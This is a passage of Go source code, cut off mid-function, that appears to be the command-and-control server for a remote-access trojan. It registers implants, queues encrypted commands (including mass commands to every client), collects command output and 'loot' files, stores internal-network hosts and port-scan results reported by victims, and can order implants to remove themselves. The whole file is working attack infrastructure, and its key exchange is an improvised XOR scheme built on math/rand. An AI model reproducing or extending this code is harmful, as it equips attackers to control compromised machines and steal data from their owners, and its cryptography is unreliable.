package main

import (
	"math/rand"
	"crypto/md5"
    "mime/multipart"
    "encoding/base64"
    "encoding/hex"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"crypto/tls"
	"encoding/json"
	"bufio"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"flag"
	"time"
	"regexp"
    "bytes"
    "errors"
    "math"
)

var (
	key_map = make(map[string]string)
	key1_map = make(map[string][]int)
	key2_map = make(map[string][]int)
	mutex   = &sync.Mutex{}
	shell_get = make(map[string]string)
	shell_post = make(map[string]string)
	file_list = make(map[string]string)
	shell_net_post = make(map[string]string)
    sessionSlice []string
    error_str string 
    check_map []map[string]string
    UploadFile_byte_parts = make(map[string][]byte)
    DownloadFile_byte_parts = make(map[string][]byte)
    parts_count = make(map[string]int)
    keyPartArr = make(map[string][]int)
)

//无权限交互
func Index() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			// 处理 GET 请求
			op := r.URL.Query().Get("op")
			uid := r.URL.Query().Get("uid")
			username := r.URL.Query().Get("username")
			shellname := r.URL.Query().Get("request")
			key_mid := r.URL.Query().Get("keyPart")
            filekey := r.URL.Query().Get("fk")
            clientIP := getClientIP(r)

			switch op {
				case "co": //监听
                    keyStr:= Get_conn(uid, username, shellname, clientIP)
                    fmt.Fprint(w, keyStr)                
				case "gM": //获取指令
					data := GetMsg(uid)
                    fmt.Fprint(w,data)
				case "st": //查询频率
					func(uid string) {
						mutex.Lock()
						defer mutex.Unlock()
						for _, client := range client_data.Clients {
							if uid == client.Uid {
                                key, exists := key_map[uid]
                                if exists {
                                    delay :=strconv.Itoa(client.Delay)
                                    encryptedCmd := Get_encry_s(&delay, &key,&uid)
                                    fmt.Fprint(w, encryptedCmd)
                                    break
                                }
							}
						}
					}(uid)
				case "sK": //发送与交换密钥
				    err := Switch_key(uid,key_mid)
                    if err != nil {
                        http.Error(w, error_str, http.StatusForbidden)
                    }
				case "EK": //获取未加密密钥
					func(uid string) {
						mutex.Lock()
						defer mutex.Unlock()
						for _, conn := range data_conn.Conns {
							if uid == conn.Uid {
								if conn.HostKey != "" && conn.HostKey != "null" {
									fmt.Fprint(w, conn.HostKey)
									EncryptHostKey(conn.Uid,conn.HostKey)
									break
								}else{
									fmt.Fprint(w,error_str)
								}
							}
						}
					}(uid)
                case "gF":
                    fileByte, err := DownloadFile(uid,filekey)
                    if err != nil {
                        http.Error(w, error_str, http.StatusInternalServerError)
                        return
                    }
                    w.Header().Set("Content-Type", "application/octet-stream")
                    w.Header().Set("Accept-Ranges", "bytes")
                    w.Write(fileByte)
                    if f, ok := w.(http.Flusher); ok {
                        f.Flush()
                    }
			}
			
		case http.MethodPost:
			op := r.URL.Query().Get("op")
			switch op {
				case "re": //写入结果
                    var requestBody map[string]string
                    decoder := json.NewDecoder(r.Body)
                    err := decoder.Decode(&requestBody)
                    if err != nil {
                        http.Error(w, error_str, http.StatusInternalServerError)
                        return
                    }
                    uid, ok1 := requestBody["uid"]
                    results, ok2 := requestBody["results"]
                    if !ok1 || !ok2{
                        return
                    }
                    Results(uid,results)
				case "ren": //接收内网信息
                    var requestBody map[string]string
                    decoder := json.NewDecoder(r.Body)
                    err := decoder.Decode(&requestBody)
                    if err != nil {
                        http.Error(w, error_str, http.StatusBadRequest)
                        return
                    }
                    uid, ok1 := requestBody["uid"]
                    results, ok2 := requestBody["results"]
                    if !ok1 || !ok2 || uid == "" || results == "" {
                        http.Error(w, error_str, http.StatusBadRequest)
                        return
                    }
					Net_results(uid,results)
				case "gi":  //接收客户端信息
                    var requestBody map[string]string
                    decoder := json.NewDecoder(r.Body)
                    err1 := decoder.Decode(&requestBody)
                    if err1 != nil {
                        http.Error(w, error_str, http.StatusInternalServerError)
                        return
                    }
                    uid,ok1 := requestBody["d"]
                    encry_str,ok2 := requestBody["f"]
                    clientIP := getClientIP(r)
                    key, ok3 := key_map[uid]
                    if !(ok1 && ok2 && ok3){
                        http.Error(w, error_str, http.StatusInternalServerError)
                        return
                    }
                    GetInfo(uid,encry_str,key,clientIP)
				case "uf": //客户端上传文件
                    uid := r.FormValue("u")
                    data := r.FormValue("d")
                    // 读取上传的文件块
                    file, header, err := r.FormFile("filedata")
                    if err != nil {
                        http.Error(w, error_str, http.StatusInternalServerError)
                        return
                    }
                    defer file.Close()
					UploadFileHandler(uid,data,header,file)
				case "pl": //客户端写入目录
                    var request map[string]string
                    decoder := json.NewDecoder(r.Body)
                    err := decoder.Decode(&request)
                    if err != nil {
                        http.Error(w, error_str, http.StatusInternalServerError)
                        return
                    }
                    uid, ok1 := request["uid"]
                    file, ok2 := request["file"]
                    if !ok1 || !ok2 {
                        http.Error(w,error_str, http.StatusBadRequest)
                        return
                    }
					Put_file_list(uid,file)
			}
		}
	}
}
//有权限交互,必须先登录,此路由下不需要错误报错回显
func User_index()http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		usernameCookie, err := r.Cookie("cookie")
        if err != nil {
            http.Error(w, error_str, http.StatusForbidden)
            return
        }
        var foundUser bool
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        if !foundUser {
            http.Error(w,error_str, http.StatusForbidden)
            return
        }
		switch r.Method {
			case http.MethodGet:
				op := r.URL.Query().Get("op")
				uid := r.URL.Query().Get("uid")
				username := r.URL.Query().Get("username")
				shellname := r.URL.Query().Get("request")
				msg := r.URL.Query().Get("msg")
				target := r.URL.Query().Get("target")
				osType := r.URL.Query().Get("osType")
                clientsCount := r.URL.Query().Get("clientsCount")
				switch op{
					case "listen": //用户操作,第一次交互
						str := Listen(username)
                        fmt.Fprint(w, str)
					case "getResults": //用户操作，获取执行结果
						results := Getresults(uid)
                        fmt.Fprint(w,results)
					case "getOs": //获取操作系统
						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprintf(w, "%s",client_data.Clients[i].OS)
									break
								}
							}
						}(uid)
					case "insertKey": //插入密钥
                        mutex.Lock()
                        defer mutex.Unlock()
						Insert_key(uid, username,shellname)
					case "msg": //用户操作,写入指令
						err_str := Getcmd(uid,msg)
                        if err_str != ""{
                            http.Error(w, err_str, http.StatusInternalServerError)
                        }
					case "delShellInnet": //用户操作删除内网
						str := Del_shell_innet(target,shellname,uid)
                        fmt.Fprintf(w,str)
					case "userIndex": //客户端信息
                        matchedClients, err := UserIndex(username, clientsCount)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        if matchedClients != nil {
                            w.Header().Set("Content-Type", "application/json")
                            err := json.NewEncoder(w).Encode(matchedClients)
                            if err != nil {
                                http.Error(w, "json data error", http.StatusInternalServerError)
                            }
                        } else {
                            w.Header().Set("Content-Type", "text/plain")
                            w.Write([]byte("noNeeded"))
                        }
					case "delIndex": //删除第一次交互
						DeleteEntry(uid)
					case "delInfo": //删除客户端
						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									client_data.Clients = append(client_data.Clients[:i], client_data.Clients[i+1:]...)
									fmt.Fprintf(w, "Successfully deleted host: Host name:%s,uid:%s",client.Host,uid)
									break
								}
							}
						}(uid)
					case "getFileList": //读取客户端目录
						file_str := Get_file_list(uid)
                        if file_str != ""{
                            fmt.Fprintf(w,file_str)
                        }
                    case "logRead": //读取日志
                        lines, err := Log_read()
                        if err != nil {
                            // 处理错误
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "text/plain")
                        for _, line := range lines {
                            fmt.Fprintln(w, line)
                        }
					case "getCurrentDir": //查询当前目录
						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprint(w, client_data.Clients[i].CurrentDir)
									break
								}
							}
						}(uid)
					case "getFile": //获取所有用户战利品
						Get_loots(username,w,r)
                    case "getAll": //获取用户名下客户端
                        shell_list, err := Get_Clients(username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        if err := json.NewEncoder(w).Encode(shell_list); err != nil {
                            http.Error(w, "json error", http.StatusInternalServerError)
                            return
                        }
					case "getShellInnet": //获取客户端内网IP
						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprintf(w, "%s",client_data.Clients[i].LocalIP)
									break
								}
							}
						}(uid)
                    case "net_getresults": // 获取客户端内网资产
                        result, err := Net_getresults(uid)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusBadRequest)
                            return
                        }
                        fmt.Fprint(w, result)                    
					case "getInnet": //查询内网资产
						getInnet(uid,w)
					case "AllMsg": //集体指令
						getAll(username,msg,osType)
                    case "checkTime":
                        checkMap, err := Check_Time(username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "confirm":
                        client, err := Confirm_chan(uid, username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusNotFound)
                            return
                        }
                    
                        w.Header().Set("Content-Type", "application/json")
                        jsonData, err := json.Marshal(client)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Write(jsonData)                    
				}
			case http.MethodPost:
				op := r.URL.Query().Get("op")
				switch op{
                    case "uploadFile":
                        uid := r.FormValue("uid")
                        file, _, err := r.FormFile("uploadFile")
                        filename := r.FormValue("filename")
                        splitSize := r.FormValue("splitSize")
                        if err != nil {
                            http.Error(w, "parameter does not exist", http.StatusInternalServerError)
                            return
                        }
                        defer file.Close()
                        // 读取文件内容到字节切片
                        fileContent, err := io.ReadAll(file)
                        if err != nil {
                            http.Error(w, "failed to read file", http.StatusInternalServerError)
                            return
                        }
                        // 调用处理文件的函数
                        filedata, err := UserUploadFile(uid,filename,splitSize,fileContent)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        // 返回处理后的文件内容
                        fmt.Fprint(w, filedata)          
                    case "change":
                        var requestData struct {
                            UID      string `json:"uid"`
                            Username string `json:"username"`
                            Remarks  string `json:"remarks"`
                            Delay    string `json:"delay"`
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        str:= Change(requestData.UID, requestData.Username, requestData.Remarks, requestData.Delay)
                        fmt.Fprintf(w,str)
				}
		}
	}
}
//接收
func GetInfo(uid,encry_str,key,clientIP string){
    data := Get_decry_s(&encry_str, &key,&uid)
    data_list := strings.Split(data,"^")
    shellname := data_list[0]
    username := data_list[1]
    osname := data_list[2]
    t := data_list[3]
    innet_ip := data_list[4]
    currentDir := data_list[5]
    version := data_list[6]
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    Remarks := "null"
    mutex.Lock()
    defer mutex.Unlock()
    hash:=md5.New()
    hash.Write([]byte(key))
    hashBytes := hash.Sum(nil)
    hashString := hex.EncodeToString(hashBytes)
    timeInt,_:= strconv.Atoi(t)
    put_client(username, shellname, osname, formattedTime, clientIP,currentDir,version,innet_ip,Remarks,uid,timeInt)
    log_str1:=fmt.Sprintf("====A new gift====\t\n%v====Received by user:%vConnection of:%v,uid:%v,Host:%v,OS:%v,Delay:%v,Key:%v,Path:%s,Shell:%s====\n", formattedTime,username,clientIP,uid,shellname, osname, t, hashString[12:], currentDir, version)
    file, _:= os.OpenFile("lain.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    defer file.Close()
    log.SetOutput(file)
    log.Println(log_str1)
}
func Change(uid, username, remarks, delay string)string{
    for i, client := range client_data.Clients {
        if uid == client.Uid {
            int_delay, err := strconv.Atoi(delay)
            if err != nil {
                return "delay is not int"
            }
            usernameModified := false
            remarksModified := false
            delayModified := false
            if username != client_data.Clients[i].Username {
                userExists := false
                for _, findUser := range client_data.Clients {
                    if findUser.Username == username {
                        userExists = true
                        break
                    }
                }
                if userExists {
                    return "user already exists"
                }
                client_data.Clients[i].Username = username
                usernameModified = true
            }      
            if remarks != client_data.Clients[i].Remarks {
                client_data.Clients[i].Remarks = remarks
                remarksModified = true
            }
            if int_delay != client_data.Clients[i].Delay {
                if int_delay < 1 {
                    int_delay = 1
                }
                client_data.Clients[i].Delay = int_delay
                delayModified = true
                cmd := "getTime^"
                Getcmd(uid,cmd)
            }
            if !usernameModified && !remarksModified && !delayModified {
                return "No changes needed"
            }
            return "confirm"
        }
    }
    return "nil"
}
func Confirm_chan(uid, username string) (Client, error) {
    for _, client := range client_data.Clients {
        if uid == client.Uid && username == client.Username {
            return client, nil
        }
    }
    return Client{}, fmt.Errorf("client not found")
}

func getClientIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		ip := forwarded
		if comma := strings.Index(forwarded, ","); comma > 0 {
			ip = forwarded[:comma]
		}
		return ip
	}
	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}

func Get_conn(uid,username, hostname,clientIP string) string {
	current := time.Now()
	formattedTime := current.Format("2006.01.02 15:04")
	mutex.Lock()
	defer mutex.Unlock()
	// 循环查询并更新链接结构体
	for i, conn := range data_conn.Conns {
		if username == conn.Username && hostname == conn.Host && uid == conn.Uid {
			data_conn.Conns[i].OnlineTime = formattedTime
            delete(key_map, uid)
            key2_map[uid] = nil
			key1_map[uid] = nil
			for {
				check_key := insert_key1_map(uid)
				if check_key == false {
					time.Sleep(1 * time.Second)
				} else {
					break
				}
			}
			//返回约定公钥,与服务器中间值
			ketStr := fmt.Sprintf("%v-%v-%v-%v-%v-%v-%v-%v",key1_map[uid][0],key1_map[uid][1],key1_map[uid][2],key1_map[uid][3],key1_map[uid][8],key1_map[uid][9],key1_map[uid][10],key1_map[uid][11])
			return ketStr
		}
	}
	// 如果未找到，则插入新链接结构体
	put_conn(username, hostname, formattedTime,uid, clientIP, "null")
    delete(key_map, uid)
    key2_map[uid] = nil
	key1_map[uid] = nil
	for {
        check_key := insert_key1_map(uid)
        if check_key == false {
            time.Sleep(1 * time.Second)
        }else{
            break
        }
    }
	//返回约定公钥,与服务器中间值
	keyStr := fmt.Sprintf("%v-%v-%v-%v-%v-%v-%v-%v",key1_map[uid][0],key1_map[uid][1],key1_map[uid][2],key1_map[uid][3],key1_map[uid][8],key1_map[uid][9],key1_map[uid][10],key1_map[uid][11])
    return keyStr
}

func Listen(username string) string {
    var lasthost string
    var host string
    var str string
    for i, client := range data_conn.Conns {
        if client.Username == username {
            host = data_conn.Conns[i].Host
        }
        if lasthost != host {
            str += fmt.Sprintf("<div class='ip-container' id='container-%s'>", host)
            str += fmt.Sprintf("<p class='ip-address' id='%s'>[Uid:%s]</p>", client.Uid, html.EscapeString(client.Uid))
            str += fmt.Sprintf("<p class='shell-address' id='%s'>[Host:%s]</p>", host, html.EscapeString(host))
            str += fmt.Sprintf("<p class='online-time'>[online time:%s]</p>", html.EscapeString(client.OnlineTime))
            str += fmt.Sprintf("<p class='shell-address'>[IP:%s]</p>", html.EscapeString(client.ShellIP))
            str += fmt.Sprintf("<button class='let-it-in-button' id='button_%s' onclick=\"get_conn('%s','%s')\">receive</button>", host, client.Uid, host)
            str += fmt.Sprintf("<button class='let-it-in-button' onclick=\"del_conn('%s')\">remove</button>", client.Uid)
            str += "</div>"
            lasthost = host
        }
    }
    return str
}

// 获取密钥
func insert_key1_map(uid string) bool {
    key1_map[uid] = []int{
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
        rand.Intn(50) + 1,
    }
    for _, key := range key1_map[uid] {
        if key <= 0 || key > 50 {
            return false 
        }
    }
    intermediate := []int{
        key1_map[uid][0] ^ key1_map[uid][4],
        key1_map[uid][1] ^ key1_map[uid][5],
        key1_map[uid][2] ^ key1_map[uid][6],
        key1_map[uid][3] ^ key1_map[uid][7],
    }
    if len(intermediate) < 4 || intermediate[0] == 0 || intermediate[1] == 0 || intermediate[2] == 0 || intermediate[3] == 0 {
        return false
    }
    key1_map[uid] = append(key1_map[uid], intermediate...)
    return true
}

//接收客户端中间值添加与服务器私钥交互计算出最终密钥再与data_conn.Conns[i].HostKey交互返回给客户端
func Switch_key(uid,key_part string)error{
	for _, conn := range data_conn.Conns {
		if uid == conn.Uid{
			serverPrivateKey := key1_map[uid][4:8]
			conn_parts := strings.Split(key_part, "-")
			clientIntermediate := make([]int, 4)
			for i, part := range conn_parts {
				var err error
				clientIntermediate[i], err = strconv.Atoi(part)
				if err != nil {
					return err
				}
			}
			serverFinalcKey := []int{
				clientIntermediate[0] ^ serverPrivateKey[0],
				clientIntermediate[1] ^ serverPrivateKey[1],
				clientIntermediate[2] ^ serverPrivateKey[2],
                clientIntermediate[3] ^ serverPrivateKey[3],
			}
			key2_map[uid] = append(key2_map[uid],serverFinalcKey...)
            return nil
		}
	}
    return nil
}

func EncryptHostKey(uid,key string){
	pavi_key,exists1 := key2_map[uid]
	client_key := []byte(key)
	if exists1{
		for j := 0; j < 256 && j < len(client_key); j++ {
			if client_key[j] < byte(pavi_key[0]) {
				client_key[j] = client_key[j] ^ byte(pavi_key[0])
			}
		}
		for j := 256; j < 512 && j < len(client_key); j++ {
			if client_key[j] < byte(pavi_key[1]) {
				client_key[j] = client_key[j] ^ byte(pavi_key[1])
			}
		}
		for j := 512; j < 768 && j < len(client_key); j++ {
			if client_key[j] < byte(pavi_key[2]) {
				client_key[j] = client_key[j] ^ byte(pavi_key[2])
			}
		}
        for j := 768; j < len(client_key); j++ {
            if client_key[j] < byte(pavi_key[3]) {
				client_key[j] = client_key[j] ^ byte(pavi_key[3])
			}
        }
		key_map[uid] = string(client_key)
        keyPartArr[uid] = append(keyPartArr[uid],6,17,int(client_key[24])-20,int(client_key[13]),
                                                                               45,int(client_key[74])-15,78,128, int(client_key[45])+int(client_key[67]) ,
                                                                               256, int(client_key[79])+int(client_key[89])+int(client_key[106]) ,384, 
                                                                               int(client_key[85])+int(client_key[94])+int(client_key[189])+int(client_key[216]),512,
                                                                              int(client_key[43])+int(client_key[443]),640,int(client_key[330])+int(client_key[864])+int(client_key[611]),
                                                                                768+int(client_key[569]),int(client_key[673])+int(client_key[74]),int(client_key[334])+int(client_key[489])+int(client_key[994]),
                                                                                int(client_key[6])+int(client_key[699])+int(client_key[1002]))
	}
}

//插入密钥
func Insert_key(uid, username, shellname string) {
    charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    rand.Seed(time.Now().UnixNano())
    keyLength := rand.Intn(255) + 1024
    keyBuilder := strings.Builder{}
    // 生成密钥
    for i := 0; i < keyLength; i++ {
        randomIndex := rand.Intn(len(charset))
        keyBuilder.WriteByte(charset[randomIndex])
    }
    // 拼接完成的密钥
    key := keyBuilder.String()
    // 查找并更新对应的连接
    for i, conn := range data_conn.Conns {
        if uid == conn.Uid && username == conn.Username && shellname == conn.Host {
            data_conn.Conns[i].HostKey = key
            break
        }
    }
}

func DeleteEntry(delshell string) {
	if delshell != "" {
		mutex.Lock()
		defer mutex.Unlock()
		for i,conn := range data_conn.Conns{
			if delshell == conn.Uid{
				data_conn.Conns = append(data_conn.Conns[:i], data_conn.Conns[i+1:]...)
				break
			}
		}
	}
}
//获取结果
func Getresults(uid string) string {
	if uid != "" {
		mutex.Lock()
		shell_results,exists1 := shell_post[uid]
		if exists1 {
			delete(shell_post,uid)
			mutex.Unlock()
			return shell_results
		} else {
			mutex.Unlock()
		}
	}
    return ""
}
//写入结果
func Results(uid,results string) {
    mutex.Lock()
	defer mutex.Unlock()
    key, exists := key_map[uid]
    if exists {
		go func(uid,results,key string) {
            var shellname string
            mutex.Lock()
			for i,client := range client_data.Clients{
				if uid == client.Uid {
					shellname = client_data.Clients[i].Host
					break
				}
			}
            decry_results := Get_decry_s(&results, &key,&uid)
            shell_post[uid] = decry_results
			mutex.Unlock()
			current := time.Now()
			formattedTime := current.Format("2006.01.02 15:04")
			// 打开文件，处理可能的错误
			file, err := os.OpenFile("lain.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
			if err != nil {
				log.Printf("unable to open log file: %v\n", err)
				return
			}
			defer file.Close()
			// 创建独立的日志记录器，避免并发冲突
			logger := log.New(file, "", log.LstdFlags)
            log_str := fmt.Sprintf("%v Host:%s  [%s]The bytes passed in is:[*%d...]\n", formattedTime,shellname,uid,len(results))
            logger.Println(log_str)
		}(uid, results, key)
    }
}

//获取内网资产
func Net_getresults(uid string) (string, error) {
    if uid == "" {
        return "", fmt.Errorf("uid is empty")
    }
    mutex.Lock()
    key, exists1 := key_map[uid]
    shell_results, exists2 := shell_net_post[uid]
    if exists1 && exists2 {
        delete(shell_net_post, uid)
        mutex.Unlock()
        decryptedData := Get_decry_s(&shell_results, &key,&uid)
        // 判断开头字符串
        if strings.HasPrefix(decryptedData, "innet^") {
            // 存入内网资产结构体...
            in_net(uid, decryptedData)
        } else if strings.HasPrefix(decryptedData, "inport^") {
            // 存入内网资产端口结构体...
            in_port(uid, decryptedData)
        }
        return decryptedData, nil
    }
    mutex.Unlock()
    return "", fmt.Errorf("data not found for uid: %s", uid)
}

//写入内网资产
func Net_results(uid,results string) {
    mutex.Lock()
    shell_net_post[uid] = results
    key, exists := key_map[uid]
    mutex.Unlock()
    if exists {
        go func(results, key, uid string) {
            var shellname string
            mutex.Lock()
            for _, client := range client_data.Clients {
                if uid == client.Uid {
                    shellname = client.Host
                    break
                }
            }
			mutex.Unlock()
            r_results := Get_decry_s(&results, &key,&uid)
            current := time.Now()
            formattedTime := current.Format("2006.01.02 15:04")
            logStr := fmt.Sprintf("%v Host%s&&%sIncoming internal network assets:[*%d...]\n", formattedTime, shellname, uid, len(r_results))
            file, err := os.OpenFile("lain.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
            if err != nil {
                log.Printf("unable to open log file: %v\n", err)
                return
            }
            defer file.Close()
            logger := log.New(file, "", log.LstdFlags)
            logger.Println(logStr)
        }(results, key, uid)
    }
}

// 获取指令
func GetMsg(uid string) string {
    mutex.Lock()
    defer mutex.Unlock()
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04:05")
    for i, client := range client_data.Clients {
        if uid == client.Uid {
            client_data.Clients[i].checkTime = formattedTime
        }
    }
    data, exists1 := shell_get[uid]
    if !exists1 {
        data = ""
    }
    _, exists2 := key_map[uid]
    if exists1 && exists2 && data != "010011010010011001" {
        delete(shell_get, uid)
    }
    if !exists2 {
        return "011001010010101000100010010110110100110101101000100010010110110"
    }
    if strings.Contains(data, "010011010010011001") {
        go DeleteEntry(uid)
        return data
    }
    return data
}

//写入指令
func Getcmd(uid,cmd string)string{
	if uid != "" && cmd != "" && !strings.Contains(cmd, "010011010010011001") && !strings.HasPrefix(cmd, "SwUVer^") && !strings.HasPrefix(cmd, "getHisports^") && !strings.HasPrefix(cmd, "getUfriends^") && !strings.HasPrefix(cmd, "loadUfile^") && !strings.HasPrefix(cmd, "getUfile^") {
		mutex.Lock()
		key, exists := key_map[uid]
		if exists {
			encryptedCmd := Get_encry_s(&cmd, &key,&uid)
			shell_get[uid] = encryptedCmd
		}
		mutex.Unlock()
	} else if strings.Contains(cmd, "010011010010011001") {
		mutex.Lock()
		shell_get[uid] = cmd
		mutex.Unlock()
	} else if strings.HasPrefix(cmd, "SwUVer^") {
		version := strings.Split(cmd, "^")[1]
		mutex.Lock()
		for i, client := range client_data.Clients {
			if uid == client.Uid {
				client_data.Clients[i].version = version
				key, exists := key_map[uid]
				if exists {
					encryptedCmd := Get_encry_s(&cmd, &key,&uid)
					shell_get[uid] = encryptedCmd
				}
			}
		}
		mutex.Unlock()
	} else if strings.HasPrefix(cmd, "getHisports^") || strings.HasPrefix(cmd, "getUfriends^") {
		parts := strings.Split(cmd, "^")
		if len(parts) == 5 {
			sleep_time, err := strconv.Atoi(parts[3])
			if err != nil {
				return "delay is not int"
			}
			if sleep_time < 1 {
				sleep_time = 1
			}
			// 处理命令的第五部分，如果不存在则使用空字符串
			part5 := "whatever"
			if parts[4] == "" {
				parts[4] = part5
			}
            if strings.Contains(parts[2], "-"){
                split_int := strings.Split(parts[2], "-")
                s,se:= strconv.Atoi(split_int[0])
                e,ee:= strconv.Atoi(split_int[1])
                if se != nil || ee != nil || s < 0 || e < 0 {
                    return "plz enter int"
                }
                if strings.HasPrefix(cmd, "getHisports^") {
                    if s > e {
                        return "s cannot exceed e"
                    }
                    if e > 65535 {
                        return "e cannot exceed 65535"
                    }
                } else if strings.HasPrefix(cmd, "getUfriends^") {
                    if s > e {
                        return "s cannot exceed e"
                    }
                    if e > 255 {
                        return "e cannot exceed 255"
                    }
                }
            }else if strings.Contains(parts[2], ",") {
                uniquePorts := []string{}
                portMap := make(map[int]bool)
                split_int := strings.Split(parts[2], ",")
                for _, v := range split_int {
                    port, err := strconv.Atoi(strings.TrimSpace(v))
                    if err != nil || port < 0 {
                        return "invalid port value"
                    }
                    // 判断端口范围
                    if strings.HasPrefix(cmd, "getHisports^") {
                        if port > 65535 {
                            return "port must be between 0 and 65535 for"
                        }
                    } else if strings.HasPrefix(cmd, "getUfriends^") {
                        if port > 255 {
                            return "port must be between 0 and 255 for"
                        }
                    }
                    // 去重逻辑
                    if !portMap[port] {
                        portMap[port] = true
                        uniquePorts = append(uniquePorts, strconv.Itoa(port))
                    }
                }
                // 将唯一端口列表重新拼接成字符串
                parts[2] = strings.Join(uniquePorts, ",")
            }else{
                return "Format error"
            }
			newCmd := fmt.Sprintf("%s^%s^%s^%d^%s", parts[0], parts[1], parts[2], sleep_time,parts[4])
			key, exists := key_map[uid]
			if exists {
				encryptedCmd := Get_encry_s(&newCmd, &key,&uid)
				mutex.Lock()
				shell_get[uid] = encryptedCmd
				mutex.Unlock()
			}
		}else {
			return "missing parameter"
		}
	}else if strings.HasPrefix(cmd, "getUfile^") || strings.HasPrefix(cmd, "loadUfile^") {
        var newCmd string
        parts := strings.Split(cmd, "^")
        if strings.HasPrefix(cmd, "getUfile^"){
            if len(parts) != 3{
                return "missing parameter"
            }else{
                splitSize, err := strconv.Atoi(parts[len(parts)-1])
                if err != nil || splitSize <= 0 {
                    parts[len(parts)-1] = "1048576"
                    newCmd = strings.Join(parts, "^")
                }else{
                    newCmd = cmd
                }
            }
        }
        if strings.HasPrefix(cmd, "loadUfile^"){
            if len(parts) != 2{
                return "missing parameter"
            }else{
                str_parts := strings.Split(parts[1], "*")
                splitSizeStr := strings.TrimSpace(str_parts[len(str_parts)-1])
                splitSize, err := strconv.Atoi(splitSizeStr)
                if err != nil {
                    return "Error converting splitSize"
                }
                if err != nil || splitSize <= 0 {
                    str_parts[len(str_parts)-1] = "1048576"
                    cmd := strings.Join(str_parts, "*")
                    newCmd = "loadUfile^"+cmd
                }else{
                    newCmd = cmd
                }
            }
        }
            key, exists := key_map[uid]
            if exists {
                encryptedCmd := Get_encry_s(&newCmd, &key,&uid)
                mutex.Lock()
                shell_get[uid] = encryptedCmd
                mutex.Unlock()
            }
    }else {
        return "missing parameter"
	}
    return ""
}

//写入内网资产
func in_net(uid,data string) {
	//正则匹配
	re := regexp.MustCompile(`\[(.*?)\]`)
	match := re.FindAllString(data, -1)
	for _,v := range match{
		v = strings.Trim(v,"[]")
		put_innet(uid,v,[]string{})
	}
}

//写入内网资产端口
func in_port(uid,data string) {
	var inport []string
	//正则匹配IP地址就匹配一次就好
	re_ip := regexp.MustCompile(`\d+\.\d+\.\d+\.\d+`)
	ip := re_ip.FindString(data)
	//正则匹配
	re := regexp.MustCompile(`\[(.*?)\]`)
	match := re.FindAllString(data, -1)
	for _,v := range match{
		v = strings.Trim(v,"[]")
		inport = append(inport,v)
	}
	put_innet(uid,ip,inport)
}

//删除内网
func Del_shell_innet(target,shellname,uid string)string{
	for i, innet := range data_innet.Innets {
		if target == innet.Target && uid == innet.Uid {
			data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
			return "Successfully deleted target"
		}
	}
    return "cannot deleted target"
}

func Check_Time(username string) ([]map[string]string, error) {
    mutex.Lock()
    defer mutex.Unlock()
    check_map := []map[string]string{}
    for _, client := range client_data.Clients {
        if client.Username == username {
            check_info := map[string]string{
                "checkTime": client.checkTime,
                "uid":       client.Uid,
            }
            check_map = append(check_map, check_info)
        }
    }
    if len(check_map) == 0 {
        return nil, fmt.Errorf("no clients found for the username: %s", username)
    }
    return check_map, nil
}


func UserIndex(username, Count string) ([]Client, error) {
    client_count, err := strconv.Atoi(Count)
    if err != nil {
        return nil, fmt.Errorf("invalid count: %v", err)
    }
    matchedCount := 0
    for _, client := range client_data.Clients {
        if client.Username == username {
            matchedCount++
        }
    }
    if client_count != matchedCount {
        var matchedClients []Client
        for _, client := range client_data.Clients {
            if client.Username == username {
                matchedClients = append(matchedClients, client)
            }
        }
        return matchedClients, nil
    } else {
        return nil, fmt.Errorf("no needed")
    }
}

//下载文件
func DownloadFile(uid,keyDecry string) ([]byte, error) {
    mutex.Lock()
    key, exists := key_map[uid]
    mutex.Unlock()
    if !exists {
        return nil,errors.New("key not found")
    }
